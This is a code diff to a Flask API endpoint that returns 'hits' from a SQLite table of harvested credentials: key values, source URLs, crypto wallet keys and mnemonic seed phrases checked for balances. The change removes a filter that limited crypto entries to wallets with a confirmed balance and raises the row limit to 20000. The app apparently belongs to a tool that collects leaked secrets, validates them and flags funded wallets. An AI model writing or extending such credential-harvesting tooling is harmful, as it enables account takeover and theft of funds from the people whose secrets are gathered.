@@ -9118,35 +9118,21 @@ def api_findings_smtp():
 
 @app.route('/api/findings/hits', methods=['GET'])
 def api_findings_hits():
-    """Full Hits table — returns the same tuple format as recent_findings but
-    with an independent high limit so the polling stats endpoint stays light.
-    Non-crypto: up to 10000 rows. Confirmed-balance crypto: up to 1000 rows."""
+    """Full Hits table — all valid/hit credentials, no balance filter.
+    Returns the same tuple format as recent_findings so mapRecent() works directly.
+    The Crypto tab handles per-wallet balance filtering; this tab shows everything."""
     try:
         conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('''
             SELECT type, key_value, source_url, timestamp, metadata, status, id
             FROM credentials
-            WHERE type NOT IN ('Crypto', 'Mnemonic')
-              AND status IN ('valid', 'hit')
-            ORDER BY id DESC LIMIT 10000
+            WHERE status IN ('valid', 'hit')
+            ORDER BY id DESC LIMIT 20000
         ''')
-        non_crypto = c.fetchall()
-        c.execute('''
-            SELECT type, key_value, source_url, timestamp, metadata, status, id
-            FROM credentials
-            WHERE type IN ('Crypto', 'Mnemonic')
-              AND status IN ('valid', 'hit')
-              AND verify_meta IS NOT NULL
-              AND json_extract(verify_meta, '$.balance_native') IS NOT NULL
-              AND json_extract(verify_meta, '$.balance_native') > 0
-            ORDER BY id DESC LIMIT 1000
-        ''')
-        crypto = c.fetchall()
+        rows = c.fetchall()
         conn.close()
-        # Return same tuple order as recent_findings so mapRecent() works directly
-        findings = non_crypto + crypto
-        return jsonify({'ok': True, 'findings': findings})
+        return jsonify({'ok': True, 'findings': rows})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
